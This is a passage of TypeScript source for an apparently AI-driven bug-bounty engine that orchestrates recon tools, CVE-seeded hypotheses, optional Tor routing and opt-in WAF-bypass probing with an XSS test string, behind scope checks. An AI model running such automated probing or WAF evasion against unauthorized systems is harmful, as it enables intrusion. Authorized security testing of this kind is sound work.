  }
  if (parserType === "plain") {
    return (out) => ({ output: out, found: out.trim().length > 0 });
  }
  // lines (default) — found must reflect whether any line actually came back;
  // it was previously hardcoded true regardless of output, so every catalog
  // tool using this parser (feroxbuster, gospider, hakrawler, waybackurls,
  // subfinder, amass, dnsx, ...) reported success even on a zero-result scan.
  return (out) => {
    const findings = out.split("\n").filter(Boolean);
    return { findings, found: findings.length > 0, count: findings.length };
  };
}

// Marks an auth pre-flight failure that must abort startHunt() rather than
// fall through to the generic "continuing unauthenticated" catch below it —
// see the two throw sites inside startHunt()'s auth-config block.
class LocalAuthConfigError extends Error {}

export class HunterEngine extends EventEmitter {
  private state!: HuntState;
  private wafSynthesizer = new IntelligenceSynthesizer();
  private scopeGuard = ScopeGuard.getInstance();
  private modelRouter = ModelRouter.getInstance();
  private roiModel = new ROIModel();
  private rlWiring = new ReinforcementWiring();
  private toolLastUsed: Map<string, number> = new Map();
  private dbSessionId = 0;
  private campaignId = 0;
  private targetId = 0;
  private hardBanned = false;
  private aborted = false;
  // Tracks vuln classes already pre-seeded (by params.focusVulnClasses or the
  // EffortScaler's focusVulnClasses, at initial start or post-crawl rescale)
  // so a rescale that raises the tier doesn't re-seed classes already present.
  private seededFocusClasses = new Set<string>();
  private provisionalEffortComplexity: import("../lib/intelligence/failure-prediction").Complexity = "trivial";
  private effortRescaled = false;
  private huntGoal = "";
  private consecutiveFailures = 0;
  private banCheckDone = false;
  private oobDegradedWarned = false;
  private authHeaders: Record<string, string> = {};
  private authConfig: AuthConfig | null = null;
  // Hard scope-narrowing gate — when non-empty, probe() only ever advances
  // hypotheses whose vulnClass is in this list, regardless of what OBSERVE-phase
  // probers or the LLM hypothesis generator produce upstream. Unlike
  // focusVulnClasses (additive — seeds extra priority hypotheses, doesn't stop
  // anything else), this is exclusionary: a smaller, more consistent surface for
  // when broad multi-class hunting is more noise than signal.
  private vulnClassAllowlist: string[] = [];
  private secondaryAuthHeaders: Record<string, string> = {};
  private mergedTools: typeof TOOL_KNOWLEDGE = TOOL_KNOWLEDGE;
  private reconContext: ReconContext | null = null;
  private reconPromise: Promise<ReconContext | null> | null = null;
  private reconObservationInjected = false;

  private async loadCustomTools(): Promise<void> {
    const now = Date.now();
    if (now - customToolsCacheTs < 5 * 60 * 1000) {
      this.mergedTools = { ...TOOL_KNOWLEDGE, ...customToolsCache };
      return;
    }
    try {
      // Load DB-defined custom tools (user-defined, wins on collision)
      const rows = await db.select().from(customTools).where(
        (await import("drizzle-orm")).eq(customTools.enabled, true)
      );
      const dbBuilt: typeof TOOL_KNOWLEDGE = {};
      for (const t of rows) {
        const template = t.commandTemplate;
        dbBuilt[t.name] = {
          description: t.description,
          vulnClasses: (t.vulnClasses as string[]) || [],
          command: (url: string) => {
            const cmd = buildCommandFromTemplate(template, url);
            // Reject unsafe/invalid URLs by yielding a no-op /bin/true invocation
            // rather than firing the tool with attacker-influenced arguments.
            if (!cmd) return { bin: "true", args: [] };
            return cmd;
          },
          parser: makeCustomParser(t.parserType),
          rateLimit: t.rateLimit,
        };
      }

      // Load Kali catalog tools that are installed on this machine
      const { KALI_CATALOG } = await import("../lib/hunter/kali-catalog");
      const catalogBuilt: typeof TOOL_KNOWLEDGE = {};
      for (const entry of KALI_CATALOG) {
        if (TOOL_KNOWLEDGE[entry.name] || dbBuilt[entry.name]) continue; // hardcoded or DB wins
        const binaryPath = checkBinarySync(entry.binary);
        if (!binaryPath) continue;
        const template = entry.commandTemplate;
        catalogBuilt[entry.name] = {
          description: entry.description,
          vulnClasses: entry.vulnClasses,
          command: (url: string) => {
            const cmd = buildCommandFromTemplate(template, url);
            if (!cmd) return { bin: "true", args: [] };
            return cmd;
          },
          parser: makeCustomParser(entry.parserType),
          rateLimit: entry.rateLimit,
        };
      }

      const combined = { ...catalogBuilt, ...dbBuilt };
      customToolsCache = combined;
      customToolsCacheTs = now;
      this.mergedTools = { ...TOOL_KNOWLEDGE, ...combined };

      const catalogCount = Object.keys(catalogBuilt).length;
      const dbCount = Object.keys(dbBuilt).length;
      if (catalogCount > 0 || dbCount > 0) {
        logger.info(`[HunterEngine] Tool registry: ${catalogCount} catalog + ${dbCount} custom + ${Object.keys(TOOL_KNOWLEDGE).length} built-in`);
      }
    } catch (err) {
      logger.warn("[HunterEngine] Failed to load custom tools, using defaults", { err: String(err) });
      this.mergedTools = TOOL_KNOWLEDGE;
    }
  }

  async startHunt(params: {
    targetUrl: string;
    programId: number;
    campaignId: number;
    targetId?: number;
    sessionId?: string;
    maxIterations?: number;
    budget?: Partial<HuntState["budget"]>;
    focusVulnClasses?: string[];
    goal?: string;
    secondaryAuthHeaders?: Record<string, string>;
    auth?: { cookie?: string; bearerToken?: string; headers?: Record<string, string> };
    corpusEnrichment?: boolean;
    proxyEnabled?: boolean;
    wafBypassEnabled?: boolean;
    /** Hard filter — when set, only these vulnClasses ever reach PROBE/verification.
     *  See the vulnClassAllowlist field comment for how this differs from focusVulnClasses. */
    vulnClassAllowlist?: string[];
  }): Promise<string> {
    this.vulnClassAllowlist = params.vulnClassAllowlist?.filter(Boolean) ?? [];
    // Hard scope gate, enforced here rather than only inside the per-hypothesis
    // probe dispatch (line ~2140) or CampaignOrchestrator's own layer1 gate —
    // several entry points (routes/hunt.ts's REST route, the "hunt:start"
    // socket handler) construct HunterEngine directly and bypass the
    // orchestrator entirely, which meant observe()'s recon traffic
    // (whatweb/curl_probe) could fire against the root target with no scope
    // check at all. This runs before any network traffic, for every caller.
    const rootScopeCheck = await this.scopeGuard.isInScope(params.targetUrl, params.programId);
    if (!rootScopeCheck.allowed) {
      logger.error("[HunterEngine] Target out of scope — hunt aborted before any probing", {
        targetUrl: params.targetUrl, programId: params.programId, reason: rootScopeCheck.reason,
      });
      coreGovernance.recordDecision({
        agentId: "hunter-engine", agentName: "HunterEngine.startHunt",
        action: `Root scope gate for ${params.targetUrl}`, actionType: "scope_check",
        verdict: "blocked", pillar: "Pillar 3 - Ethical Boundary",
        confidence: 1, reason: rootScopeCheck.reason,
        coachMessage: `Hunt rejected: ${rootScopeCheck.reason}`,
      });
      throw new Error(`Target out of scope: ${rootScopeCheck.reason}`);
    }
    coreGovernance.recordDecision({
      agentId: "hunter-engine", agentName: "HunterEngine.startHunt",
      action: `Root scope gate for ${params.targetUrl}`, actionType: "scope_check",
      verdict: "approved", pillar: "Pillar 3 - Ethical Boundary",
      confidence: 1, reason: "In scope",
      coachMessage: "Hunt authorized to proceed",
    });

    await this.loadCustomTools();

    const sessionUuid = params.sessionId || uuidv4();
    this.campaignId = params.campaignId;
    this.targetId = params.targetId ?? 0;

    this.state = {
      sessionId: sessionUuid,
      targetUrl: params.targetUrl,
      programId: params.programId,
      phase: "observe",
      observations: [],
      hypotheses: [],
      probes: [],
      confirmedFindings: [],
      iteration: 0,
      maxIterations: params.maxIterations || 10,
      budget: {
        maxRequests: params.budget?.maxRequests || 5000,
        requestsMade: 0,
        maxTime: params.budget?.maxTime || 7200,
        elapsed: 0,
      },
      corpusEnrichment: params.corpusEnrichment !== false,
      proxyEnabled: params.proxyEnabled === true,
      wafBypassEnabled: params.wafBypassEnabled === true,
      discoveredEndpoints: [],
    };

    // Persist session and capture the real DB ID
    const [session] = await db.insert(huntSessions).values({
      campaignId: params.campaignId,
      targetId: params.targetId ?? 0,
      sessionUuid,
      phase: "observe",
      status: "running",
    }).returning();
    this.dbSessionId = session.id;

    // Register this session with the meta-reasoner so its decision journal,
    // health evaluation, and strategy-weight learning actually fire. Without
    // this, evaluateEnriched() aborts immediately and the learning loop never
    // records a single entry for engine-driven hunts.
    try {
      metaReasoner.initializeHuntState(sessionUuid);
    } catch (err) {
      logger.debug("[HunterEngine] meta-reasoner init skipped (non-fatal)", { err: String(err) });
    }

    // Pre-seed hypotheses from template focus classes if provided
    if (params.focusVulnClasses?.length) {
      this.seedFocusHypotheses(params.focusVulnClasses, params.targetUrl, "Template-focused");
    }

    // Store secondary auth for dual-context IDOR probes
    if (params.secondaryAuthHeaders && Object.keys(params.secondaryAuthHeaders).length > 0) {
      this.secondaryAuthHeaders = params.secondaryAuthHeaders;
      logger.info("[HunterEngine] Secondary auth configured for dual-context IDOR", {
        headerCount: Object.keys(params.secondaryAuthHeaders).length,
      });
    }

    // Load auth config for this program and establish session if configured
    try {
      const [prog] = await db.select({ authConfig: programs.authConfig })
        .from(programs).where(eq(programs.id, params.programId)).limit(1);
      if (prog?.authConfig) {
        this.authConfig = prog.authConfig as AuthConfig;

        // A stale authConfig pointing at a different host/port than the target
        // being hunted (e.g. a "Custom: localhost" program record left over from
        // a previous target) reliably produces the same silent failure as a bad
        // password: login() swallows the error and the hunt runs its entire
        // budget unauthenticated, only discoverable after the fact via log
        // forensics. On local/lab targets there's no legitimate reason for the
        // login host to differ from the target host (unlike real bug-bounty
        // programs, which can genuinely have auth on a separate subdomain), so
        // fail fast here instead of burning the whole run to find out.
        const targetHost = (() => { try { return new URL(params.targetUrl).host; } catch { return ""; } })();
        const loginHost = (() => {
          try { return this.authConfig?.loginUrl ? new URL(this.authConfig.loginUrl).host : ""; }
          catch { return ""; }
        })();
        const isLocalHost = (h: string) => /^(localhost|127\.|::1)(:|$)/.test(h);
        if (loginHost && targetHost && loginHost !== targetHost && isLocalHost(targetHost)) {
          const msg = `authConfig.loginUrl host (${loginHost}) does not match target host (${targetHost}) for a local/lab target. `
            + `This is almost always a stale program record — fix programs.auth_config for programId ${params.programId} before hunting.`;
          logger.error("[HunterEngine] AUTH CONFIG HOST MISMATCH — aborting before probing", {
            programId: params.programId, loginHost, targetHost, loginUrl: this.authConfig.loginUrl,
          });
          throw new LocalAuthConfigError(msg);
        }

        const session = await sessionManager.login(params.programId, this.authConfig);
        this.authHeaders = session.headers;
        // login() NEVER throws — it returns an empty session when the target login
        // couldn't be reached (e.g. AggregateError on a localhost ::1 refusal) or
        // returned no session material. Detect that and surface it LOUDLY: a hunt
        // silently running unauthenticated can't exercise idor/auth_bypass/business_
        // logic/authed-info_disclosure and produces misleading 0-verified results.
        const hasAuthMaterial = Object.keys(session.headers).length > 0 || Boolean(session.cookies);
        if (hasAuthMaterial) {
          logger.info("[HunterEngine] Authenticated session established", { programId: params.programId });
        } else {
          const reason = "Login reached no session (check loginUrl reachability + credentials). Auth-gated vuln classes will not be tested.";
          logger.error("[HunterEngine] AUTH CONFIGURED BUT LOGIN PRODUCED NO SESSION — hunting UNAUTHENTICATED", {
            programId: params.programId,
            loginUrl: this.authConfig.loginUrl,
            authType: this.authConfig.authType ?? "form",
          });
          this.emit("hunt:auth_failed", {
            sessionId: this.state?.sessionId ?? "",
            programId: params.programId,
            loginUrl: this.authConfig.loginUrl,
            reason,
          });
          // Same reasoning as the host-mismatch check above: on a local/lab
          // target, auth being configured but never establishing a session is
          // never intentional, so don't waste the run finding that out later.
          if (isLocalHost(targetHost)) {
            throw new LocalAuthConfigError(`Auth configured for local target but login produced no session — ${reason}`);
          }
        }
      }
    } catch (err) {
      if (err instanceof LocalAuthConfigError) throw err;
      logger.warn("[HunterEngine] Auth setup failed — continuing unauthenticated", { err: String(err) });
    }

    // Direct auth from hunt params — overrides DB-stored session for the same keys.
    if (params.auth) {
      if (params.auth.cookie) this.authHeaders["Cookie"] = params.auth.cookie;
      if (params.auth.bearerToken) this.authHeaders["Authorization"] = `Bearer ${params.auth.bearerToken}`;
      if (params.auth.headers) Object.assign(this.authHeaders, params.auth.headers);
      if (Object.keys(this.authHeaders).length > 0) {
        logger.info("[HunterEngine] Direct auth headers injected from hunt params",
          { keys: Object.keys(this.authHeaders) });
      }
    }

    // Start interactsh for public OOB callbacks — skip for local/private targets since
    // interactsh.com can't reach them and the startup attempt just produces a noisy warn.
    const targetHostname = (() => { try { return new URL(params.targetUrl).hostname; } catch { return ""; } })();
    const isLocalTarget = /^(localhost|127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1)/.test(targetHostname);
    if (!isLocalTarget) {
      interactshManager.start().then(domain => {
        if (domain) logger.info("[HunterEngine] Interactsh OOB active", { domain });
      }).catch(() => {});
    }

    this.rlWiring.onHuntStart({
      sessionId: sessionUuid,
      programId: params.programId,
      programType: "web_app",
    });

    // Effort scaling — PROVISIONAL only, before any crawling has happened.
    // This call has no real signal about the target beyond the launch
    // string, so it must never be trusted to gate high-severity vuln classes
    // away — that's what caused a real sentprime hunt to score "trivial" and
    // never even consider rce/auth_bypass/idor before observe() ran. The
    // floor in effort-scaling.ts guarantees those three are always in
    // focusVulnClasses regardless of tier; a real rescale happens after the
    // first observe() completes, once actual crawl signal exists (below).
    this.huntGoal = params.goal ?? "";
    const effort = effortScaler.analyze(params.targetUrl, this.huntGoal);
    this.provisionalEffortComplexity = effort.complexity;
    if (params.budget?.maxRequests === undefined) {
      // Only override if the caller didn't explicitly request a budget —
      // let explicit overrides win over the provisional estimate.
      this.state.budget.maxRequests = effort.probeLimit;
    }
    this.seedFocusHypotheses(effort.focusVulnClasses, params.targetUrl, "Effort-profile priority (provisional)");
    logger.info("[HunterEngine] Effort profile (provisional, pre-crawl)", { complexity: effort.complexity, probeLimit: effort.probeLimit, rationale: effort.rationale, focusVulnClasses: effort.focusVulnClasses });
    contextWriter.alert("effort", { complexity: effort.complexity, probeLimit: effort.probeLimit, provisional: true });

    contextWriter.reset(sessionUuid, params.targetUrl, "claude");

    // Validate tor is reachable if proxy routing was requested
    if (params.proxyEnabled) {
      const torOk = await new Promise<boolean>(resolve => {
        const net = require('net') as typeof import('net');
        const s = net.createConnection(9050, '127.0.0.1');
        s.setTimeout(2000);
        s.on('connect', () => { s.destroy(); resolve(true); });
        s.on('error', () => resolve(false));
        s.on('timeout', () => { s.destroy(); resolve(false); });
      });
      if (!torOk) {
        throw new Error('Proxy routing requested but Tor SOCKS5 (127.0.0.1:9050) is unreachable. Start tor before launching a proxied hunt.');
      }
    }

    this.emit("hunt:started", { sessionUuid, targetUrl: params.targetUrl, proxyEnabled: params.proxyEnabled === true });
    logger.info("Hunt started", { sessionUuid, targetUrl: params.targetUrl, proxyEnabled: params.proxyEnabled });

    // Run stealth warmup before probing so WAF/CDN fingerprinting is pre-loaded
    try {
      const domain = new URL(params.targetUrl).hostname;
      await stealthCoordinator.runWarmup(domain, 'generic', false, params.programId);
    } catch { /* non-critical — target may not be reachable yet */ }

    // Pre-warm logic_exploit_agent's system+tools prompt cache — fire-and-forget
    // so a slow warm-up call never delays the first observe() phase. Idempotent
    // (no-ops after the first warm call of the process), so safe to call per hunt.
    logicExploitAgent.prewarmCache().catch(() => {});

    // Phase 0: passive OSINT recon — runs concurrently with first observe()
    // Resolves before hypothesize() is called so the model reasons over real attack surface.
    this.reconPromise = new ReconRunner(params.targetUrl, sessionUuid, (e, d) => this.emit(e, d), params.programId)
      .run()
      .then(ctx => { this.reconContext = ctx; return ctx; })
      .catch(err => {
        logger.warn("[HunterEngine] Recon runner failed (non-critical)", { err: String(err) });
        return null;
      });

    // Run the main loop asynchronously
    this.runLoop().catch(err => {
      logger.error("Hunt loop error", { sessionUuid, err });
      this.emit("hunt:error", { sessionUuid, error: String(err) });
    });

    return sessionUuid;
  }

  /** Yield to the Node.js event loop so other async tasks (socket.io, sibling hunts)
   *  can process pending callbacks between heavy model-inference phases. */
  private yieldToEventLoop(): Promise<void> {
    return new Promise(resolve => setImmediate(resolve));
  }

  /** Pre-seed priority hypotheses for a set of vuln classes, deduped against
   *  classes already seeded (by an earlier call to this same method, whether
   *  from an explicit template override or the EffortScaler's focusVulnClasses
   *  — at initial start or a post-crawl rescale). */
  private seedFocusHypotheses(vulnClasses: string[], targetUrl: string, reasonPrefix: string): void {
    for (const vc of vulnClasses) {
      if (this.seededFocusClasses.has(vc)) continue;
      this.seededFocusClasses.add(vc);
      this.state.hypotheses.push({
        id: uuidv4(),
        vulnClass: vc,
        targetUrl,
        reasoning: `${reasonPrefix}: ${vc} is a priority for this hunt`,
        confidence: 0.6,
        priority: 9,
        evidence: [],
        status: "pending",
        createdAt: Date.now(),
      });
    }
  }

  /**
   * Re-run EffortScaler once real crawl signal exists (post-first-observe),
   * using discovered endpoints instead of just the launch string. Only ever
   * escalates — never downgrades — the provisional pre-crawl profile: under-
   * provisioning (the actual failure this fixes) is the risk; over-
   * provisioning from a false-positive escalation is comparatively cheap.
   * Newly-added focus vuln classes from the higher tier get seeded via the
   * same dedup path as the provisional call, so nothing is seeded twice.
   */
  private rescaleEffortFromCrawlSignal(): void {
    if (this.state.discoveredEndpoints.length === 0) return; // nothing new to rescale from
    const rescaled = effortScaler.analyze(this.state.targetUrl, this.huntGoal, this.state.discoveredEndpoints);
    if (!isHigherTier(rescaled.complexity, this.provisionalEffortComplexity)) {
      logger.debug("[HunterEngine] Post-crawl effort rescale did not raise the tier — keeping provisional profile", {
        provisional: this.provisionalEffortComplexity, rescaled: rescaled.complexity,
      });
      return;
    }
    this.provisionalEffortComplexity = rescaled.complexity;
    // Never shrink an explicitly-set budget — only raise it if the rescaled
    // tier calls for more than what's currently configured.
    if (rescaled.probeLimit > this.state.budget.maxRequests) {
      this.state.budget.maxRequests = rescaled.probeLimit;
    }
    this.seedFocusHypotheses(rescaled.focusVulnClasses, this.state.targetUrl, "Effort-profile priority (post-crawl rescale)");
    logger.info("[HunterEngine] Effort profile rescaled from crawl signal", {
      complexity: rescaled.complexity, probeLimit: rescaled.probeLimit, rationale: rescaled.rationale,
      endpointsSeen: this.state.discoveredEndpoints.length,
    });
    contextWriter.alert("effort", { complexity: rescaled.complexity, probeLimit: rescaled.probeLimit, provisional: false });
  }

  private async runLoop(): Promise<void> {
    const startTime = Date.now();

    while (
      this.state.iteration < this.state.maxIterations &&
      this.state.budget.requestsMade < this.state.budget.maxRequests &&
      (Date.now() - startTime) / 1000 < this.state.budget.maxTime &&
      !this.hardBanned &&
      !this.aborted
    ) {
      this.state.iteration++;
      this.state.budget.elapsed = (Date.now() - startTime) / 1000;

      // Yield before each phase so concurrent hunts / socket events aren't starved
      await this.yieldToEventLoop();

      this.emit("hunt:phase", { phase: this.state.phase, iteration: this.state.iteration });
      contextWriter.updateState({
        phase: this.state.phase,
        iteration: this.state.iteration,
        hypothesesCount: this.state.hypotheses.length,
        findingsCount: this.state.confirmedFindings.length,
      });
      contextWriter.alert("phase", { phase: this.state.phase, iteration: this.state.iteration });

      try {
        switch (this.state.phase) {
          case "observe":
            await this.observe();
            await this.yieldToEventLoop();
            if (!this.effortRescaled) {
              this.effortRescaled = true;
              this.rescaleEffortFromCrawlSignal();
            }
            this.state.phase = "hypothesize";
            break;
          case "hypothesize":
            await this.hypothesize();
            await this.yieldToEventLoop();
            this.state.phase = "probe";
            break;
          case "probe":
            await this.probe();
            await this.yieldToEventLoop();
            this.state.phase = "update";
            break;
          case "update":
            await this.update();
            // Determine next phase based on state
            if (this.state.hypotheses.filter(h => h.status === "pending").length > 0) {
              this.state.phase = "probe";
            } else {
              this.state.phase = "observe"; // re-observe with new knowledge
            }
            break;
        }
      } catch (err) {
        const msg = err instanceof Error ? err.message : String(err);
        logger.error("Hunt phase error", { phase: this.state.phase, err });
        contextWriter.alert("error", { phase: this.state.phase, iteration: this.state.iteration, msg: msg.slice(0, 200) });
      }

      // Feed live progress into the meta-reasoner so its decision journal and
      // health evaluation carry real findings/confidence signal each iteration.
      try {
        const avgConfidence = this.state.hypotheses.length > 0
          ? this.state.hypotheses.reduce((s, h) => s + h.confidence, 0) / this.state.hypotheses.length
          : 0.5;
        metaReasoner.syncHuntProgress(this.state.sessionId, {
          findingsCount: this.state.confirmedFindings.length,
          confidence: avgConfidence,
        });
      } catch { /* non-fatal */ }

      // Every 3 iterations run a meta-reasoner evaluation. This is called
      // unconditionally (not only when degraded) so the decision journal records
      // an entry each cycle — the strategy-weight learner needs that data to
      // close the cross-hunt learning loop. The pivot action is still gated on
      // the meta-reasoner's own decision.
      if (this.state.iteration % 3 === 0) {
        try {
          const health = huntCortex.computeHuntHealth(this.state.sessionId);
          const decision = await metaReasoner.evaluateEnriched(this.state.sessionId);
          if (decision.action === 'pivot') {
            const paths = backwardPlanner.getOptimalPath(this.state.phase, undefined, undefined);
            const pivotHypotheses = paths.slice(0, 2).map(p => ({
              id: uuidv4(),
              vulnClass: p.path.vulnerability,
              targetUrl: this.state.targetUrl,
              reasoning: `Meta-reasoner pivot (health=${health.health.toFixed(2)}): ${p.path.goal}`,
              confidence: Math.min(0.85, p.adjustedLikelihood),
              priority: Math.min(10, Math.round(p.path.priority)),
              evidence: [],
              status: 'pending' as const,
              createdAt: Date.now(),
            }));
            this.state.hypotheses.push(...pivotHypotheses);
            if (this.state.hypotheses.length > MAX_HYPOTHESES) {
              this.state.hypotheses.sort((a, b) => truncationRank(b) - truncationRank(a));
              this.state.hypotheses.splice(MAX_HYPOTHESES);
            }
            this.state.phase = 'probe';
            this.emit('hunt:pivot', { sessionId: this.state.sessionId, reason: decision.rationale, newHypotheses: pivotHypotheses.length });
            logger.info('[HunterEngine] Strategy pivot injected', { health: health.health, paths: pivotHypotheses.length, rationale: decision.rationale });
          }
        } catch { /* non-critical — health check failure must not stop the hunt */ }
      }
    }

    this.state.phase = "complete";
    // Diagnostic (2026-07-03): several sentprime benchmark runs completed far
    // short of maxIterations with budget/time nowhere near their ceilings, and
    // it wasn't obvious from the alerts/digest files which of the 5 while-loop
    // conditions actually went false. Log all 5 explicitly so the NEXT early
    // completion is diagnosable directly instead of re-derived by elimination.
    logger.info("[HunterEngine] runLoop exited — condition snapshot", {
      sessionId: this.state.sessionId,
      iteration: this.state.iteration, maxIterations: this.state.maxIterations,
      requestsMade: this.state.budget.requestsMade, maxRequests: this.state.budget.maxRequests,
      elapsedSec: this.state.budget.elapsed, maxTimeSec: this.state.budget.maxTime,
      hardBanned: this.hardBanned, aborted: this.aborted,
    });
    contextWriter.updateState({ phase: "complete", findingsCount: this.state.confirmedFindings.length });
    contextWriter.alert("complete", {
      findings: this.state.confirmedFindings.length,
      iterations: this.state.iteration,
      probes: this.state.probes.length,
      exitReason: {
        iterationCap: this.state.iteration >= this.state.maxIterations,
        requestCap: this.state.budget.requestsMade >= this.state.budget.maxRequests,
        timeCap: this.state.budget.elapsed >= this.state.budget.maxTime,
        hardBanned: this.hardBanned,
        aborted: this.aborted,
      },
    });
    observationCompressor.clearSession(this.state.sessionId);
    ClaudeClient.clearSession(this.state.sessionId);
    // Release the authenticated session so credentials/cookies aren't held after the hunt.
    if (this.authConfig) {
      sessionManager.invalidate(this.state.programId);
    }
    this.rlWiring.onHuntComplete({
      sessionId: this.state.sessionId,
      programId: this.state.programId,
      programType: "web_app",
      confirmedFindings: this.state.confirmedFindings.length,
      totalProbes: this.state.probes.length,
      chainIds: [],
    });
    await this.persistResults();
    this.emit("hunt:complete", {
      sessionId: this.state.sessionId,
      findings: this.state.confirmedFindings.length,
      iterations: this.state.iteration,
    });
    logger.info("Hunt complete", {
      sessionId: this.state.sessionId,
      confirmedFindings: this.state.confirmedFindings.length,
    });
  }

  // ── Phase 1: Observe ────────────────────────────────────────────────────────
  private async observe(): Promise<void> {
    logger.info("OBSERVE phase", { session: this.state.sessionId, iteration: this.state.iteration });

    // Initial observation: fingerprint the target — emit probing/result per tool
    // so the activity feed shows immediate activity rather than a blank wait.
    const t0 = Date.now();
    this.emit("hunt:probing", { hypothesisId: this.state.sessionId, vulnClass: "observe", tool: "whatweb" });
    logger.info("[OBSERVE] running whatweb", { session: this.state.sessionId });
    const techObs = await this.runTool("whatweb", this.state.targetUrl);
    logger.info("[OBSERVE] whatweb done", { session: this.state.sessionId, ms: Date.now() - t0 });
    this.emit("hunt:probe_result", {
      hypothesisId: this.state.sessionId,
      result: { tool: "whatweb", success: true, output: JSON.stringify(techObs).slice(0, 300), duration: Date.now() - t0 },
    });

    const t1 = Date.now();
    this.emit("hunt:probing", { hypothesisId: this.state.sessionId, vulnClass: "observe", tool: "curl_probe" });
    logger.info("[OBSERVE] running curl_probe", { session: this.state.sessionId });
    const headerObs = await this.runTool("curl_probe", this.state.targetUrl);
    logger.info("[OBSERVE] curl_probe done", { session: this.state.sessionId, ms: Date.now() - t1 });
    this.emit("hunt:probe_result", {
      hypothesisId: this.state.sessionId,
      result: { tool: "curl_probe", success: true, output: JSON.stringify(headerObs).slice(0, 300), duration: Date.now() - t1 },
    });

    const t2 = Date.now();
    let wafIntel: UnifiedIntelligence | { detectionConfidence: number };
    if (!this.state.wafBypassEnabled) {
      // WAF bypass/evasion is opt-in per hunt (some program scopes explicitly
      // disallow it, some are silent, some explicitly allow it) — skip entirely
      // rather than defaulting to running it.
      logger.info("[OBSERVE] waf_intel skipped — WAF bypass not enabled for this hunt", { session: this.state.sessionId });
      wafIntel = { detectionConfidence: 0 };
    } else {
      this.emit("hunt:probing", { hypothesisId: this.state.sessionId, vulnClass: "observe", tool: "waf_intel" });
      logger.info("[OBSERVE] running waf_intel", { session: this.state.sessionId });
      // synthesize() now internally caps its bypass-probe loop at 8s (see WAFBypass.ts)
      // and skips it entirely when no WAF is fingerprinted, so it should never approach
      // this outer ceiling in practice — this is just the hard safety net.
      const WAF_TIMEOUT = 12000;
      try {
        wafIntel = await Promise.race([
          this.wafSynthesizer.synthesize(this.state.targetUrl, "<script>alert(1)</script>", this.state.sessionId, this.state.programId),
          new Promise<{ detectionConfidence: number }>((resolve) =>
            setTimeout(() => {
              logger.warn("[OBSERVE] waf_intel timed out after 12s — continuing", { session: this.state.sessionId });
              resolve({ detectionConfidence: 0 });
            }, WAF_TIMEOUT)
          ),
        ]);
      } catch (err) {
        // Two distinct failure modes were previously conflated here. A program
        // whose wafBypassPolicy is "disallowed" throws too — that's fine to
        // swallow, it just means skip WAF bypass for this hunt. But a genuine
        // "Out of scope" throw (WAFBypass's own ScopeGuard check) means the
        // TARGET ITSELF isn't authorized — silently continuing the hunt in
        // that case would be exactly the swallowed-scope-violation bug this
        // was flagged for. The root scope check in startHunt() should make this
        // unreachable for the initial target, but re-throw rather than swallow
        // in case scope changed mid-hunt (program edited while running).
        if (String(err).includes("Out of scope")) {
          logger.error("[OBSERVE] Target went out of scope mid-hunt — aborting", { session: this.state.sessionId, err: String(err) });
          throw err;
        }
        logger.warn("[OBSERVE] waf_intel blocked or errored — continuing without it", { session: this.state.sessionId, err: String(err) });
        wafIntel = { detectionConfidence: 0 };
      }
      logger.info("[OBSERVE] waf_intel done", { session: this.state.sessionId, ms: Date.now() - t2 });
    }
    this.emit("hunt:probe_result", {
      hypothesisId: this.state.sessionId,
      result: { tool: "waf_intel", success: true, output: `waf=${(wafIntel as unknown as Record<string, unknown>).detectedWAF ?? "none"} confidence=${wafIntel.detectionConfidence?.toFixed(2)}`, duration: Date.now() - t2 },
    });

    // Anomaly-first: compute anomaly scores
    const obs: Observation[] = [
      {
        id: uuidv4(),
        timestamp: Date.now(),
        source: "whatweb",
        data: techObs,
        anomalyScore: this.computeAnomalyScore(techObs),
        tags: ["fingerprint"],
      },
      {
        id: uuidv4(),
        timestamp: Date.now(),
        source: "curl_probe",
        data: headerObs,
        anomalyScore: this.computeAnomalyScore(headerObs),
        tags: ["headers", "security"],
      },
      {
        id: uuidv4(),
        timestamp: Date.now(),
        source: "waf_intel",
        data: wafIntel as unknown as Record<string, unknown>,
        anomalyScore: wafIntel.detectionConfidence,
        tags: ["waf"],
      },
    ];

    // Sort by anomaly score (anomaly-first scanning)
    obs.sort((a, b) => b.anomalyScore - a.anomalyScore);
    this.state.observations.push(...obs);
    while (this.state.observations.length > MAX_OBSERVATIONS) this.state.observations.shift();

    this.emit("hunt:observations", { count: obs.length, observations: obs });

    // Inject Phase 0 recon as a structured observation (once, when recon is available)
    if (this.reconContext && !this.reconObservationInjected) {
      this.reconObservationInjected = true;
      const alive = this.reconContext.subdomains.filter(s => s.alive);
      const reconObs: Observation = {
        id: uuidv4(),
        timestamp: Date.now(),
        source: "recon_runner",
        data: {
          subdomainsDiscovered: this.reconContext.subdomains.length,
          aliveSubdomains: alive.map(s => s.subdomain),
          interestingHistoricalUrls: this.reconContext.interestingUrls.slice(0, 20),
          historicalPathCount: this.reconContext.historicalPathCount,
        },
        anomalyScore: this.reconContext.interestingUrls.length > 5 ? 0.8 : 0.4,
        tags: ["recon", "subdomains", "wayback", "osint", "attack_surface"],
      };
      this.state.observations.push(reconObs);
      this.emit("hunt:observations", { count: 1, observations: [reconObs] });
      logger.info("[HunterEngine] Phase 0 recon observation injected", {
        subdomains: this.reconContext.subdomains.length,
        aliveSubdomains: alive.length,
        interestingUrls: this.reconContext.interestingUrls.length,
      });
    }

    // CVE-seeded hypothesis injection — first observe pass only
    if (this.state.iteration === 1) {
      logger.info("[OBSERVE] running seedCVEHypotheses", { session: this.state.sessionId });
      await this.seedCVEHypotheses(techObs).catch(err =>
        logger.warn("[HunterEngine] CVE seeding failed (non-critical)", { err: String(err) })
      );
      logger.info("[OBSERVE] seedCVEHypotheses done", { session: this.state.sessionId });
      // GraphQL probing — detect and introspect any GraphQL endpoints
      logger.info("[OBSERVE] running probeGraphQL", { session: this.state.sessionId });
      await this.probeGraphQL().catch(err =>
        logger.warn("[HunterEngine] GraphQL probing failed (non-critical)", { err: String(err) })
      );
      logger.info("[OBSERVE] probeGraphQL done", { session: this.state.sessionId });
      logger.info("[OBSERVE] running Promise.allSettled parallel probes", { session: this.state.sessionId });
      await Promise.allSettled([
      // Secret scanning — look for leaked credentials in response bodies
      (async () => {
        try {
          const secretResult = await secretScanner.scan(this.state.targetUrl, this.authHeaders, this.state.programId);
          if (secretResult.matches.length > 0) {
            for (const hyp of secretResult.hypotheses) {
              this.state.hypotheses.push({
                id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
                reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
